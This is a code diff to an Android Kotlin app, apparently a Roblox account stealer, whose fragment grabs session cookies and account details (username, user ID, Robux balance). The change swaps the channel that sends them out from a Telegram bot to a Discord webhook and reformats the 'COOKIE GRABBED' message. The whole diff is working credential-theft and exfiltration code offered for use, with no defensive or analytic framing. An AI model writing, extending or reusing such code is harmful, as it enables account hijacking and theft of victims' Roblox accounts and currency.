@@ -18,7 +18,7 @@ import com.rbxtool.app.util.Constants
 import com.rbxtool.app.util.CookieManager
 import com.rbxtool.app.util.RobloxApi
 import com.rbxtool.app.util.RootUtils
-import com.rbxtool.app.util.TelegramHelper
+import com.rbxtool.app.util.DiscordHelper
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
@@ -137,9 +137,9 @@ class GrabFragment : Fragment() {
             tgBtn.isEnabled = false
             tgBtn.text = "Sending..."
             lifecycleScope.launch {
-                val msg = buildTgMessage(account, pkg, cookie)
+                val msg = buildDiscordMessage(account, pkg, cookie)
                 val ok = withContext(Dispatchers.IO) {
-                    TelegramHelper.sendMessage(Constants.BOT_TOKEN, Constants.CHAT_ID, msg)
+                    DiscordHelper.sendMessage(Constants.DISCORD_WEBHOOK, msg)
                 }
                 tgBtn.text = if (ok) "✓ SENT!" else "❌ GAGAL"
             }
@@ -151,19 +151,20 @@ class GrabFragment : Fragment() {
         b.resultsContainer.addView(card)
     }
 
-    private fun buildTgMessage(account: Account?, pkg: String, cookie: String) = buildString {
-        appendLine("🔥 <b>COOKIE GRABBED</b>")
+    private fun buildDiscordMessage(account: Account?, pkg: String, cookie: String) = buildString {
+        appendLine("🔥 **COOKIE GRABBED**")
         appendLine()
         if (account != null) {
-            appendLine("👤 <b>Username:</b> <code>${account.username}</code>")
-            appendLine("📛 <b>Display:</b> ${account.displayName}")
-            appendLine("🆔 <b>UserID:</b> <code>${account.id}</code>")
-            appendLine("💰 <b>Robux:</b> ${account.robux}")
+            appendLine("👤 **Username:** ${account.username}")
+            appendLine("📛 **Display:** ${account.displayName}")
+            appendLine("🆔 **UserID:** ${account.id}")
+            appendLine("💰 **Robux:** ${account.robux}")
             appendLine()
         }
-        appendLine("📦 <b>App:</b> $pkg")
+        appendLine("📦 **App:** $pkg")
         appendLine()
-        append("🍪 <b>Cookie:</b>\n<code>$cookie</code>")
+        appendLine("🍪 **Cookie:**")
+        append("```$cookie```")
     }
 
     override fun onDestroyView() { super.onDestroyView(); _b = null }
